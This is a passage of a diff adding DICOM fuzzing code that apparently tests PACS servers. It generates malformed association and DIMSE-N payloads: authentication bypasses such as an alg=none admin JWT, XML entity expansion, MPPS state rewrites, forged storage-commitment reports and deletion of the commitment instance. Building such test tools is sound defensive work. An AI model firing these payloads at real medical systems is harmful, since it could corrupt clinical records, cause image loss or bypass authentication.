+                identity_type=USER_IDENTITY_USERNAME_PASSCODE,
+                bug_class='authentication-bypass'),
+        )
+
+    @staticmethod
+    def user_identity_primary_length_lie() -> AttackResult:
+        """Primary field length declares far more than the bytes that follow."""
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_USERNAME, b'admin', declared_primary_len=0xFFFF))
+        return AttackResult(
+            name='negotiation_user_identity_primary_length_lie',
+            category='negotiation',
+            payload=payload,
+            description='User Identity primary field declares 65535 bytes, 5 present',
+            expected_behavior='Target must bound the declared length by the '
+                              'remaining sub-item bytes before reading',
+            metadata=_negotiation_metadata(
+                'user-identity-length-handling', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_USERNAME,
+                declared_length=0xFFFF, actual_length=5,
+                bug_class='length-vs-content-mismatch'),
+        )
+
+    @staticmethod
+    def user_identity_secondary_length_lie() -> AttackResult:
+        """Secondary (passcode) field length overruns the sub-item."""
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_USERNAME_PASSCODE, b'admin', b'pw',
+            declared_secondary_len=0x7FFF))
+        return AttackResult(
+            name='negotiation_user_identity_secondary_length_lie',
+            category='negotiation',
+            payload=payload,
+            description='User Identity passcode field declares 32767 bytes, 2 present',
+            expected_behavior='Target must bound the passcode read by the '
+                              'sub-item length',
+            metadata=_negotiation_metadata(
+                'user-identity-length-handling', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_USERNAME_PASSCODE,
+                declared_length=0x7FFF, actual_length=2,
+                bug_class='length-vs-content-mismatch'),
+        )
+
+    @staticmethod
+    def user_identity_oversized_username(size: int = 8192) -> AttackResult:
+        """Username far longer than any deployment expects."""
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_USERNAME, b'A' * size))
+        return AttackResult(
+            name='negotiation_user_identity_oversized_username',
+            category='negotiation',
+            payload=payload,
+            description=f'User Identity username of {size} bytes',
+            expected_behavior='Target should reject or bound an oversized '
+                              'identity without a fixed-size copy',
+            metadata=_negotiation_metadata(
+                'user-identity-length-handling', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_USERNAME, size=size,
+                bug_class='unbounded-copy'),
+        )
+
+    @staticmethod
+    def user_identity_undefined_type(identity_type: int = 0xFF) -> AttackResult:
+        """Identity type outside the values PS3.7 D.3.3.7.1 defines."""
+        payload = _negotiation_rq(_user_identity_bytes(identity_type, b'probe'))
+        return AttackResult(
+            name='negotiation_user_identity_undefined_type',
+            category='negotiation',
+            payload=payload,
+            description=f'User Identity type {identity_type:#x} is not defined in PS3.7',
+            expected_behavior='Target should reject an unknown identity type '
+                              'rather than dispatch on it',
+            metadata=_negotiation_metadata(
+                'user-identity-type-dispatch', _ITEM_USER_IDENTITY_RQ,
+                identity_type=identity_type, bug_class='unvalidated-type-dispatch'),
+        )
+
+    @staticmethod
+    def user_identity_kerberos_garbage() -> AttackResult:
+        """Kerberos identity type carrying bytes that are not a service ticket."""
+        ticket = b'\x6e\x82\xff\xff' + b'\x00\x01\x02\x03' * 32
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_KERBEROS, ticket))
+        return AttackResult(
+            name='negotiation_user_identity_kerberos_garbage',
+            category='negotiation',
+            payload=payload,
+            description='User Identity type 3 with a malformed Kerberos service ticket '
+                        '(ASN.1 tag with an oversized length)',
+            expected_behavior='Ticket parsing must fail closed without reading '
+                              'past the supplied bytes',
+            metadata=_negotiation_metadata(
+                'user-identity-ticket-parser', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_KERBEROS,
+                bug_class='asn1-length-handling'),
+        )
+
+    @staticmethod
+    def user_identity_saml_entity_expansion() -> AttackResult:
+        """SAML identity whose assertion is an XML entity-expansion document.
+
+        Type 4 feeds attacker bytes straight to an XML parser. This is the
+        classic reachability probe for a parser left with entity resolution
+        enabled; the entity here is internal and inert.
+        """
+        assertion = (
+            b'<?xml version="1.0"?>'
+            b'<!DOCTYPE Assertion ['
+            b'<!ENTITY a "AAAAAAAAAA">'
+            b'<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
+            b'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">'
+            b']>'
+            b'<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion">&c;</Assertion>'
+        )
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_SAML, assertion))
+        return AttackResult(
+            name='negotiation_user_identity_saml_entity_expansion',
+            category='negotiation',
+            payload=payload,
+            description='User Identity type 4 with a SAML assertion declaring '
+                        'nested internal XML entities',
+            expected_behavior='XML parsing must run with entity expansion and '
+                              'external entity resolution disabled',
+            metadata=_negotiation_metadata(
+                'user-identity-xml-parser', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_SAML,
+                bug_class='xml-entity-expansion',
+                expansion_factor=1000),
+        )
+
+    @staticmethod
+    def user_identity_jwt_alg_none() -> AttackResult:
+        """JWT identity with alg=none and no signature segment."""
+        header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
+        claims = base64.urlsafe_b64encode(
+            b'{"sub":"c-scare","iss":"c-scare","admin":true}').rstrip(b'=')
+        token = header + b'.' + claims + b'.'
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_JWT, token))
+        return AttackResult(
+            name='negotiation_user_identity_jwt_alg_none',
+            category='negotiation',
+            payload=payload,
+            description='User Identity type 5 with an unsigned alg=none JWT',
+            expected_behavior='Target must reject alg=none and require a '
+                              'verified signature before accepting the identity',
+            metadata=_negotiation_metadata(
+                'user-identity-jwt-verification', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_JWT,
+                bug_class='signature-verification-bypass'),
+        )
+
+    # -------------------------------------------------------------------------
+    # Extended negotiation, role selection, async window
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def extended_negotiation_oversized_app_info(size: int = 4096) -> AttackResult:
+        """SOP Class Extended Negotiation with oversized application information."""
+        sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
+        body = struct.pack('!H', len(sop)) + sop + b'\xFF' * size
+        payload = _negotiation_rq(_item_bytes(_ITEM_SOP_EXTENDED_NEGOTIATION, body))
+        return AttackResult(
+            name='negotiation_extended_oversized_app_info',
+            category='negotiation',
+            payload=payload,
+            description=f'SOP Class Extended Negotiation with {size} bytes of '
+                        'service-class application information',
+            expected_behavior='Target should bound the application-information '
+                              'field against the sub-item length',
+            metadata=_negotiation_metadata(
+                'extended-negotiation', _ITEM_SOP_EXTENDED_NEGOTIATION,
+                size=size, bug_class='unbounded-copy'),
+        )
+
+    @staticmethod
+    def extended_negotiation_uid_length_overrun() -> AttackResult:
+        """Extended negotiation SOP Class UID length overruns the sub-item."""
+        sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
+        body = struct.pack('!H', 0xFFFF) + sop + b'\x01'
+        payload = _negotiation_rq(_item_bytes(_ITEM_SOP_EXTENDED_NEGOTIATION, body))
+        return AttackResult(
+            name='negotiation_extended_uid_length_overrun',
+            category='negotiation',
+            payload=payload,
+            description='SOP Class Extended Negotiation UID length declares 65535 '
+                        f'bytes, {len(sop)} present',
+            expected_behavior='Target must clamp the UID length to the sub-item '
+                              'before slicing',
+            metadata=_negotiation_metadata(
+                'extended-negotiation', _ITEM_SOP_EXTENDED_NEGOTIATION,
+                declared_length=0xFFFF, actual_length=len(sop),
+                bug_class='length-vs-content-mismatch'),
+        )
+
+    @staticmethod
+    def role_selection_unnegotiated_sop_class() -> AttackResult:
+        """Role selection naming a SOP class no presentation context offered."""
+        sop = MR_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
+        body = struct.pack('!H', len(sop)) + sop + b'\x01\x01'
+        payload = _negotiation_rq(
+            _item_bytes(_ITEM_ROLE_SELECTION, body),
+            abstract_syntax=CT_IMAGE_STORAGE_SOP_CLASS_UID)
+        return AttackResult(
+            name='negotiation_role_selection_unnegotiated_sop_class',
+            category='negotiation',
+            payload=payload,
+            description='SCP/SCU Role Selection references a SOP class absent '
+                        'from every presentation context',
+            expected_behavior='Target should ignore or reject role selection for '
+                              'an unoffered abstract syntax, not index on it',
+            metadata=_negotiation_metadata(
+                'role-selection', _ITEM_ROLE_SELECTION,
+                bug_class='unmatched-lookup'),
+        )
+
+    @staticmethod
+    def role_selection_both_roles_set() -> AttackResult:
+        """Role selection claiming both SCU and SCP roles for one SOP class."""
+        sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
+        body = struct.pack('!H', len(sop)) + sop + b'\x01\x01'
+        payload = _negotiation_rq(_item_bytes(_ITEM_ROLE_SELECTION, body))
+        return AttackResult(
+            name='negotiation_role_selection_both_roles_set',
+            category='negotiation',
+            payload=payload,
+            description='SCP/SCU Role Selection sets both SCU and SCP roles, '
+                        'inviting the target to act as SCP on its own request',
+            expected_behavior='Target should resolve roles to a single supported '
+                              'direction before any data transfer',
+            metadata=_negotiation_metadata(
+                'role-selection', _ITEM_ROLE_SELECTION,
+                bug_class='role-confusion'),
+        )
+
+    @staticmethod
+    def async_window_zero_operations() -> AttackResult:
+        """Asynchronous Operations Window advertising a zero-sized window."""
+        body = struct.pack('!HH', 0, 0)
+        payload = _negotiation_rq(_item_bytes(_ITEM_ASYNC_OPERATIONS_WINDOW, body))
+        return AttackResult(
+            name='negotiation_async_window_zero_operations',
+            category='negotiation',
+            payload=payload,
+            description='Asynchronous Operations Window invokes 0 and performs 0',
+            expected_behavior='Target should clamp to at least one outstanding '
+                              'operation rather than deadlock or divide by the window',
+            metadata=_negotiation_metadata(
+                'async-operations-window', _ITEM_ASYNC_OPERATIONS_WINDOW,
+                bug_class='zero-window-deadlock'),
+        )
+
+    @staticmethod
+    def duplicate_user_identity_items() -> AttackResult:
+        """Two User Identity sub-items in one A-ASSOCIATE-RQ.
+
+        PS3.7 D.3.3.7 allows one. Which one a target binds decides whose
+        identity the association runs as, so a target that keeps the first for
+        authorization but the last for logging is auditing the wrong principal.
+        """
+        first = _user_identity_bytes(USER_IDENTITY_USERNAME, b'lowpriv')
+        second = _user_identity_bytes(USER_IDENTITY_USERNAME, b'admin')
+        payload = _negotiation_rq(first + second)
+        return AttackResult(
+            name='negotiation_duplicate_user_identity_items',
+            category='negotiation',
+            payload=payload,
+            description='A-ASSOCIATE-RQ carries two User Identity sub-items '
+                        "('lowpriv' then 'admin')",
+            expected_behavior='Target should reject a duplicated User Identity '
+                              'item; authorization and audit must never bind '
+                              'different ones',
+            metadata=_negotiation_metadata(
+                'user-identity-duplication', _ITEM_USER_IDENTITY_RQ,
+                identities=['lowpriv', 'admin'],
+                bug_class='duplicate-item-precedence'),
+        )
+
+    @staticmethod
+    def user_information_item_length_overrun() -> AttackResult:
+        """A user-information sub-item whose length runs past the PDU."""
+        body = struct.pack('!I', 16384)
+        oversized = bytes([_ITEM_MAX_LENGTH, 0]) + struct.pack('!H', 0xFFFF) + body
+        payload = _negotiation_rq(oversized)
+        return AttackResult(
+            name='negotiation_user_information_item_length_overrun',
+            category='negotiation',
+            payload=payload,
+            description='Maximum Length sub-item declares 65535 bytes inside a '
+                        'PDU that is far shorter',
+            expected_behavior='Sub-item walking must stop at the PDU boundary',
+            metadata=_negotiation_metadata(
+                'user-information-item-walk', _ITEM_MAX_LENGTH,
+                declared_length=0xFFFF, actual_length=len(body),
+                bug_class='item-walk-overrun'),
+        )
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every association-negotiation attack payload."""
+        yield cls.user_identity_empty_credentials()
+        yield cls.user_identity_primary_length_lie()
+        yield cls.user_identity_secondary_length_lie()
+        yield cls.user_identity_oversized_username()
+        yield cls.user_identity_undefined_type()
+        yield cls.user_identity_kerberos_garbage()
+        yield cls.user_identity_saml_entity_expansion()
+        yield cls.user_identity_jwt_alg_none()
+        yield cls.duplicate_user_identity_items()
+        yield cls.extended_negotiation_oversized_app_info()
+        yield cls.extended_negotiation_uid_length_overrun()
+        yield cls.role_selection_unnegotiated_sop_class()
+        yield cls.role_selection_both_roles_set()
+        yield cls.async_window_zero_operations()
+        yield cls.user_information_item_length_overrun()
+
+
+# =============================================================================
+# DIMSE-N Attacks - normalized services: MPPS, Storage Commitment (PS3.7 10.1)
+# =============================================================================
+
+def _n_pdata_bytes(command_pkt, dataset: Optional[bytes] = None,
+                   context_id: int = 1) -> bytes:
+    """Wrap a DIMSE-N command (and optional data set) in one P-DATA-TF."""
+    if not SCAPY_AVAILABLE:
+        body = b'\x00\x00\x00\x00' + (dataset or b'')
+        return b'\x04\x00' + struct.pack('!I', len(body)) + body
+
+    pdv_items = [PresentationDataValueItem(
+        context_id=context_id, is_last=1, is_command=1, data=raw(command_pkt),
+    )]
+    if dataset is not None:
+        pdv_items.append(PresentationDataValueItem(
+            context_id=context_id, is_last=1, is_command=0, data=dataset,
+        ))
+    return raw(DICOM() / P_DATA_TF(pdv_items=pdv_items))
+
+
+def _n_service_sequence(command_pkt,
+                        sop_class_uid: str,
+                        dataset: Optional[bytes] = None,
+                        called_ae: str = 'MPPSSCP') -> Tuple[bytes, List[bytes]]:
+    """A-ASSOCIATE-RQ || DIMSE-N P-DATA-TF || A-RELEASE-RQ."""
+    assoc = _associate_rq_bytes(called_ae, 'C-SCARE-FZ', sop_class_uid)
+    pdata = _n_pdata_bytes(command_pkt, dataset)
+    release = _release_rq_bytes()
+    steps = [assoc, pdata, release]
+    return b''.join(steps), steps
+
+
+def _dimse_n_metadata(service: str, command: str, **extra) -> Dict[str, Any]:
+    metadata = {
+        'service_class': service,
+        'dimse_command': command,
+        'target_role': 'scp-server',
+        'delivery': 'dicom-sequence',
+        'reference': 'PS3.4 Annex F (MPPS) / Annex J (Storage Commitment)',
+    }
+    metadata.update(extra)
+    return metadata
+
+
+class DimseNAttacks:
+    """
+    DIMSE-N normalized service abuse: MPPS and Storage Commitment.
+
+    The C-services (STORE/FIND/MOVE/GET) get almost all the testing attention,
+    but a PACS that supports worklists also speaks N-CREATE/N-SET for Modality
+    Performed Procedure Step and N-ACTION/N-EVENT-REPORT for Storage
+    Commitment. Those handlers are usually newer, less exercised, and — unlike
+    C-STORE — they mutate *workflow state* rather than just storing an object,
+    so the interesting failures are logic failures: unauthorized state
+    transitions, forged transaction identity, and unsolicited results.
+
+    Each payload is a full A-ASSOCIATE-RQ / P-DATA-TF / A-RELEASE-RQ sequence
+    in ``metadata['steps']``; deliver with ``deliver.send_sequence``.
+    """
+
+    _MPPS_INSTANCE = '1.2.826.0.1.3680043.10.543.700.1'
+
+    @staticmethod
+    def _mpps_dataset(status: str, extra: Optional[List[Element]] = None) -> bytes:
+        ds = Dataset()
+        ds = ds / Element(0x0040, 0x0252, 'CS', status)   # Performed Procedure Step Status
+        ds = ds / Element(0x0040, 0x0253, 'SH', 'C-SCARE')  # PPS ID
+        ds = ds / Element(0x0008, 0x0060, 'CS', 'OT')
+        for element in (extra or []):
+            ds = ds / element
+        return ds.encode(implicit_vr=True)
+
+    # -------------------------------------------------------------------------
+    # Modality Performed Procedure Step (PS3.4 Annex F)
+    # -------------------------------------------------------------------------
+
+    @classmethod
+    def mpps_ncreate_dataset_flag_without_data(cls) -> AttackResult:
+        """N-CREATE says a data set follows, then sends none.
+
+        MPPS N-CREATE is meaningless without its attribute list, so a handler
+        that trusts Command Data Set Type reaches its attribute lookup with
+        nothing behind it.
+        """
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable('mpps_ncreate_dataset_flag_without_data')
+        cmd = N_CREATE_RQ(
+            affected_sop_class_uid=MPPS_SOP_CLASS_UID,
+            message_id=1,
+            data_set_type=0x0102,      # a data set is present
+            affected_sop_instance_uid=cls._MPPS_INSTANCE,
+        )
+        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset=None)
+        return AttackResult(
+            name='dimse_n_mpps_ncreate_dataset_flag_without_data',
+            category='dimse_n',
+            payload=payload,
+            description='MPPS N-CREATE-RQ declares a data set but sends only the command',
+            expected_behavior='SCP should fail the operation rather than read an '
+                              'absent attribute list',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-CREATE-RQ', steps=steps,
+                bug_class='command-vs-dataset-mismatch',
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def mpps_nset_unknown_instance(cls) -> AttackResult:
+        """N-SET against an MPPS instance that was never created."""
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable('mpps_nset_unknown_instance')
+        cmd = N_SET_RQ(
+            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
+            message_id=2,
+            data_set_type=0x0102,
+            requested_sop_instance_uid='1.2.826.0.1.3680043.10.543.700.999',
+        )
+        dataset = cls._mpps_dataset('COMPLETED')
+        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset)
+        return AttackResult(
+            name='dimse_n_mpps_nset_unknown_instance',
+            category='dimse_n',
+            payload=payload,
+            description='MPPS N-SET-RQ updates a Performed Procedure Step that '
+                        'no N-CREATE ever established',
+            expected_behavior='SCP should return "no such object instance" '
+                              '(0x0112), not create or update state',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-SET-RQ', steps=steps,
+                bug_class='missing-instance-check',
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def mpps_nset_reopen_completed_step(cls) -> AttackResult:
+        """N-SET moving a COMPLETED procedure step back to IN PROGRESS.
+
+        PS3.4 F.7.2 makes COMPLETED and DISCONTINUED final. A step that can be
+        reopened lets a caller rewrite the performed-procedure record that
+        billing and audit read from.
+        """
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable('mpps_nset_reopen_completed_step')
+        cmd = N_SET_RQ(
+            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
+            message_id=3,
+            data_set_type=0x0102,
+            requested_sop_instance_uid=cls._MPPS_INSTANCE,
+        )
+        dataset = cls._mpps_dataset('IN PROGRESS')
+        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset)
+        return AttackResult(
+            name='dimse_n_mpps_nset_reopen_completed_step',
+            category='dimse_n',
+            payload=payload,
+            description='MPPS N-SET-RQ sets Performed Procedure Step Status back '
+                        'to IN PROGRESS',
+            expected_behavior='SCP must refuse to leave a COMPLETED or '
+                              'DISCONTINUED step (PS3.4 F.7.2)',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-SET-RQ', steps=steps,
+                bug_class='illegal-state-transition',
+                target_field='(0040,0252) Performed Procedure Step Status',
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def mpps_nset_final_state_undefined_value(cls) -> AttackResult:
+        """N-SET with a Performed Procedure Step Status outside the enum."""
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable('mpps_nset_final_state_undefined_value')
+        cmd = N_SET_RQ(
+            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
+            message_id=4,
+            data_set_type=0x0102,
+            requested_sop_instance_uid=cls._MPPS_INSTANCE,
+        )
+        dataset = cls._mpps_dataset('C-SCARE-UNDEF')
+        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset)
+        return AttackResult(
+            name='dimse_n_mpps_nset_undefined_status',
+            category='dimse_n',
+            payload=payload,
+            description='MPPS N-SET-RQ carries a Performed Procedure Step Status '
+                        'outside the defined enumeration',
+            expected_behavior='SCP should reject an undefined enumerated value '
+                              'rather than store or dispatch on it',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-SET-RQ', steps=steps,
+                bug_class='unvalidated-enumerated-value',
+                target_field='(0040,0252) Performed Procedure Step Status',
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def mpps_ncreate_duplicate_instance(cls) -> AttackResult:
+        """Two N-CREATEs claiming the same Affected SOP Instance UID."""
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable('mpps_ncreate_duplicate_instance')
+        dataset = cls._mpps_dataset('IN PROGRESS')
+        assoc = _associate_rq_bytes('MPPSSCP', 'C-SCARE-FZ', MPPS_SOP_CLASS_UID)
+        first = _n_pdata_bytes(N_CREATE_RQ(
+            affected_sop_class_uid=MPPS_SOP_CLASS_UID, message_id=5,
+            data_set_type=0x0102,
+            affected_sop_instance_uid=cls._MPPS_INSTANCE), dataset)
+        second = _n_pdata_bytes(N_CREATE_RQ(
+            affected_sop_class_uid=MPPS_SOP_CLASS_UID, message_id=6,
+            data_set_type=0x0102,
+            affected_sop_instance_uid=cls._MPPS_INSTANCE), dataset)
+        steps = [assoc, first, second, _release_rq_bytes()]
+        return AttackResult(
+            name='dimse_n_mpps_ncreate_duplicate_instance',
+            category='dimse_n',
+            payload=b''.join(steps),
+            description='Two MPPS N-CREATE-RQs claim the same SOP Instance UID '
+                        'in one association',
+            expected_behavior='SCP should reject the second with "duplicate SOP '
+                              'instance" (0x0111) rather than overwrite the first',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-CREATE-RQ', steps=steps,
+                bug_class='duplicate-instance-overwrite',
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    # -------------------------------------------------------------------------
+    # Storage Commitment Push Model (PS3.4 Annex J)
+    # -------------------------------------------------------------------------
+
+    @classmethod
+    def storage_commitment_naction_unstored_instances(cls) -> AttackResult:
+        """Commitment request naming instances the SCP never received.
+
+        The SCP must answer with a Failed SOP Sequence. One that reports
+        success for objects it does not hold gives the SCU permission to
+        delete its only copy.
+        """
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable('storage_commitment_naction_unstored_instances')
+        ds = Dataset()
+        ds = ds / Element(0x0008, 0x1195, 'UI', '1.2.826.0.1.3680043.10.543.701.1')
+        ds = ds / Element(0x0008, 0x1199, 'SQ', b'')     # Referenced SOP Sequence
+        ds = ds / Element(0x0008, 0x1150, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
+        ds = ds / Element(0x0008, 0x1155, 'UI', '1.2.826.0.1.3680043.10.543.701.404')
+        cmd = N_ACTION_RQ(
+            requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
+            message_id=7,
+            data_set_type=0x0102,
+            requested_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+            action_type_id=1,
+        )
+        payload, steps = _n_service_sequence(
+            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, ds.encode(implicit_vr=True),
+            called_ae='COMMITSCP')
+        return AttackResult(
+            name='dimse_n_storage_commitment_unstored_instances',
+            category='dimse_n',
+            payload=payload,
+            description='Storage Commitment N-ACTION-RQ requests commitment for '
+                        'a SOP Instance the SCP never stored',
+            expected_behavior='SCP must report the instance in the Failed SOP '
+                              'Sequence, never as committed',
+            metadata=_dimse_n_metadata(
+                'Storage Commitment', 'N-ACTION-RQ', steps=steps,
+                bug_class='false-commitment',
+                target_field='(0008,1199) Referenced SOP Sequence',
+                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def storage_commitment_naction_invalid_action_type(cls) -> AttackResult:
+        """Commitment N-ACTION with an action type PS3.4 J does not define."""
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable('storage_commitment_naction_invalid_action_type')
+        cmd = N_ACTION_RQ(
+            requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
+            message_id=8,
+            data_set_type=0x0101,           # no data set
+            requested_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+            action_type_id=0xFFFF,
+        )
+        payload, steps = _n_service_sequence(
+            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, called_ae='COMMITSCP')
+        return AttackResult(
+            name='dimse_n_storage_commitment_invalid_action_type',
+            category='dimse_n',
+            payload=payload,
+            description='Storage Commitment N-ACTION-RQ uses Action Type ID '
+                        '0xFFFF (only 1 is defined)',
+            expected_behavior='SCP should return "no such action type" (0x0123) '
+                              'without indexing an action table on it',
+            metadata=_dimse_n_metadata(
+                'Storage Commitment', 'N-ACTION-RQ', steps=steps,
+                bug_class='unvalidated-type-dispatch',
+                action_type_id=0xFFFF,
+                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def storage_commitment_unsolicited_event_report(cls) -> AttackResult:
+        """N-EVENT-REPORT pushed without any prior N-ACTION request.
+
+        Commitment results normally arrive on a *separate* association from
+        the SCP. An implementation that accepts a result it never asked for
+        can be told that objects are safely committed by any peer that can
+        reach its listening port.
+        """
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable('storage_commitment_unsolicited_event_report')
+        ds = Dataset()
+        ds = ds / Element(0x0008, 0x1195, 'UI', '1.2.826.0.1.3680043.10.543.701.2')
+        ds = ds / Element(0x0008, 0x1199, 'SQ', b'')
+        ds = ds / Element(0x0008, 0x1150, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
+        ds = ds / Element(0x0008, 0x1155, 'UI', '1.2.826.0.1.3680043.10.543.701.7')
+        cmd = N_EVENT_REPORT_RQ(
+            affected_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
+            message_id=9,
+            data_set_type=0x0102,
+            affected_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+            event_type_id=1,                # 1 = Storage Commitment Request Successful
+        )
+        payload, steps = _n_service_sequence(
+            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, ds.encode(implicit_vr=True),
+            called_ae='COMMITSCU')
+        return AttackResult(
+            name='dimse_n_storage_commitment_unsolicited_event_report',
+            category='dimse_n',
+            payload=payload,
+            description='Unsolicited Storage Commitment N-EVENT-REPORT-RQ reports '
+                        'success for a Transaction UID the receiver never issued',
+            expected_behavior='Receiver must correlate the Transaction UID to an '
+                              'outstanding request it made, and ignore the rest',
+            metadata=_dimse_n_metadata(
+                'Storage Commitment', 'N-EVENT-REPORT-RQ', steps=steps,
+                bug_class='unsolicited-result-acceptance',
+                target_field='(0008,1195) Transaction UID',
+                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def storage_commitment_event_report_invalid_event_type(cls) -> AttackResult:
+        """Commitment N-EVENT-REPORT with an event type outside PS3.4 J."""
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable(
+                'storage_commitment_event_report_invalid_event_type')
+        cmd = N_EVENT_REPORT_RQ(
+            affected_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
+            message_id=10,
+            data_set_type=0x0101,
+            affected_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+            event_type_id=0xFFFF,
+        )
+        payload, steps = _n_service_sequence(
+            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, called_ae='COMMITSCU')
+        return AttackResult(
+            name='dimse_n_storage_commitment_invalid_event_type',
+            category='dimse_n',
+            payload=payload,
+            description='Storage Commitment N-EVENT-REPORT-RQ uses Event Type ID '
+                        '0xFFFF (only 1 and 2 are defined)',
+            expected_behavior='Receiver should return "no such event type" '
+                              '(0x0113) without indexing on the value',
+            metadata=_dimse_n_metadata(
+                'Storage Commitment', 'N-EVENT-REPORT-RQ', steps=steps,
+                bug_class='unvalidated-type-dispatch',
+                event_type_id=0xFFFF,
+                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
+        )
+
+    # -------------------------------------------------------------------------
+    # Generic normalized-service handling
+    # -------------------------------------------------------------------------
+
+    @classmethod
+    def n_get_attribute_list_bomb(cls, count: int = 8192) -> AttackResult:
+        """N-GET whose Attribute Identifier List repeats one tag ``count`` times.
+
+        (0000,1005) is VR AT with VM 1-n, so a long list is legal encoding.
+        The question is whether the SCP bounds the list before allocating a
+        result per requested attribute.
+        """
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable('n_get_attribute_list_bomb')
+        cmd = N_GET_RQ(
+            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
+            message_id=11,
+            data_set_type=0x0101,
+            requested_sop_instance_uid=cls._MPPS_INSTANCE,
+            attribute_identifier_list=[(0x0040, 0x0252)] * count,
+        )
+        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID)
+        return AttackResult(
+            name='dimse_n_get_attribute_list_bomb',
+            category='dimse_n',
+            payload=payload,
+            description=f'N-GET-RQ Attribute Identifier List repeats one tag {count} times',
+            expected_behavior='SCP should bound the requested attribute list '
+                              'before allocating per-attribute state',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-GET-RQ', steps=steps,
+                bug_class='unbounded-value-multiplicity',
+                target_field='(0000,1005) Attribute Identifier List',
+                requested_attribute_count=count,
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def n_delete_well_known_instance(cls) -> AttackResult:
+        """N-DELETE aimed at the well-known Storage Commitment SOP instance.
+
+        1.2.840.10008.1.20.1.1 is fixed by the standard and is not a
+        deletable object; an SCP that routes it into a generic instance-delete
+        path can lose the commitment service for every peer.
+        """
+        if not SCAPY_AVAILABLE:
+            return cls._unavailable('n_delete_well_known_instance')
+        cmd = N_DELETE_RQ(
+            requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
+            message_id=12,
+            data_set_type=0x0101,
+            requested_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+        )
+        payload, steps = _n_service_sequence(
+            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, called_ae='COMMITSCP')
+        return AttackResult(
+            name='dimse_n_delete_well_known_instance',
+            category='dimse_n',
+            payload=payload,
+            description='N-DELETE-RQ targets the well-known Storage Commitment '
